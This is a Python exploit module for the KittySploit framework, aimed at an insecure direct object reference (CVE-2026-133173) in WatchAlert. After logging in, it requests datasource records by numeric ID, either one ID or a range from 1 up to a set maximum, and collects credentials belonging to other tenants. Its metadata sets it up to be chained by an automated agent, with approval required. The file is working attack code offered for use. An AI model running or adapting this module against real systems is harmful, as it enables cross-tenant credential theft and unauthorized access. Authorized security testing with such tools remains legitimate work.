#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-133173 — WatchAlert cross-tenant datasource leak."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.watchalert import Watchalert


class Module(Auxiliary, Http_client, Watchalert):
    __info__ = {
        "name": "WatchAlert CVE-2026-133173 datasource IDOR",
        "description": "Reads datasource credentials by numeric ID (cross-tenant).",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-133173"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-133173"],
        "tags": ["watchalert", "idor", "cve-2026-133173", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["credential_leak"],
            "chain": {
                "suggested_followups": ["scanner/http/watchalert_cve_2026_133173_detect"],
            },
        },
    }

    username = OptString("", "WatchAlert username", required=True)
    password = OptString("", "WatchAlert password", required=True)
    tenant_id = OptString("", "Workspace / tenant id", required=True)
    target_id = OptString("", "Single datasource ID (optional)", required=False)
    enumerate = OptBool(True, "Enumerate IDs 1..max_id", required=False)
    max_id = OptString("50", "Last ID to probe", required=False, advanced=True)

    def run(self):
        if not self.watchalert_login():
            print_error("WatchAlert login failed")
            return False
        leaked = []
        tid = str(self.target_id or "").strip()
        if hasattr(self, "target_id") and hasattr(self.target_id, "value"):
            tid = str(self.target_id.value or "").strip()
        if tid:
            data = self.watchalert_get_datasource(int(tid))
            if data:
                leaked.append({"id": int(tid), "data": data})
        else:
            en = getattr(self, "enumerate", True)
            if hasattr(en, "value"):
                en = en.value
            if en:
                raw_max = str(getattr(self, "max_id", "50") or "50")
                if hasattr(raw_max, "value"):
                    raw_max = str(raw_max.value or "50")
                leaked = self.watchalert_idor_probe(int(raw_max))
        if not leaked:
            print_error("No foreign datasource leaked")
            return False
        print_success(f"IDOR confirmed — {len(leaked)} datasource(s)")
        self.set_info(severity="high", cve="CVE-2026-133173", leaked=len(leaked))
        return True